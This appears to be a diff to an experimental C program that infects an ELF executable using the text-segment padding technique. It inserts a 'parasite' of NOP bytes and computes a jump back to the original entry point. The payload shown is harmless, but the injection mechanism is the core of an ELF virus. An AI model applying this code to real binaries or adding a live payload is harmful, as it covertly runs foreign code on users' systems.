@@ -9,11 +9,14 @@
 #include <errno.h>
 
 
+
 int main(){
 
     char *path_to_elf = "simple_executable";
     char * host;
-    static  unsigned char * parasite =  "\x90\xE9\xF2\xFC\xFF\xFF";
+    unsigned char * parasite =  (unsigned  char*)"\x90\x90\xE9\xF2\xFC\xFF\xF1";
+    size_t  jump_length = 5;
+    size_t length_without_jump = 2;
     struct stat sb;
     size_t psize = getpagesize();
     int jmp_len = strlen(parasite);
@@ -37,7 +40,8 @@ int main(){
     Elf64_Ehdr* ehdr = (Elf64_Ehdr *) mem;
     Elf64_Phdr* phdr = (Elf64_Phdr *) &mem[ehdr->e_phoff];
     Elf64_Shdr* shdr = (Elf64_Shdr *) &mem[ehdr->e_shoff];
-    Elf32_Addr parasite_insertion_address, start_of_text, end_of_text;
+    Elf32_Addr parasite_insertion_address, start_of_text, end_of_text, older_entry;
+    older_entry = ehdr->e_entry;
     printf("%x\n", ehdr->e_entry);
     ehdr->e_shoff += psize;
 //
@@ -73,12 +77,20 @@ int main(){
         printf("%d", errno);
         return -1;
     }
-    if(write(out_fd, parasite, jmp_len) < 0){
+    Elf64_Addr jmp = older_entry - (ehdr->e_entry + jump_length + length_without_jump);
+    static unsigned char address[4];
+    *(int*)&address[0] = jmp;
+
+
+    if(write(out_fd, parasite, length_without_jump + 1) < 0){
         return -1;
     }
-    char buf[jmp_len];
-    read(out_fd, buf, jmp_len);
-    printf(buf);
+
+    if(write(out_fd, address, 4) < 0){
+        return -1;
+    }
+
+
     if(lseek(out_fd, psize - jmp_len, SEEK_CUR) < 0){
         return -1;
     }
